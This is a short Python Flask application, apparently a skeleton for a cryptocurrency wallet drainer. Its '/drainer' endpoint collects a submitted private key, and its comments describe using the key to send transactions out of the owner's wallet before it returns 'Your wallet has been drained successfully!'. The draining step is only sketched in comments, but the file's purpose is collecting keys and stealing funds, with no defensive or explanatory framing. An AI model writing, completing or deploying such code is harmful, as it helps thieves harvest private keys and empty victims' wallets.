from flask import Flask, request, render_template
import requests

app = Flask(__name__)

@app.route('/', methods=['GET'])
def home():
    return render_template('index.html')

@app.route('/drainer', methods=['POST'])
def drain_wallet():
    private_key = request.form.get('private_key')
    # Perform wallet draining logic using private_key here
    # Example: Use a third-party API or custom script to send transactions from the user's wallet
    # Return a confirmation message to the user
    return "Your wallet has been drained successfully!"

if __name__ == '__main__':
    app.run(debug=True)
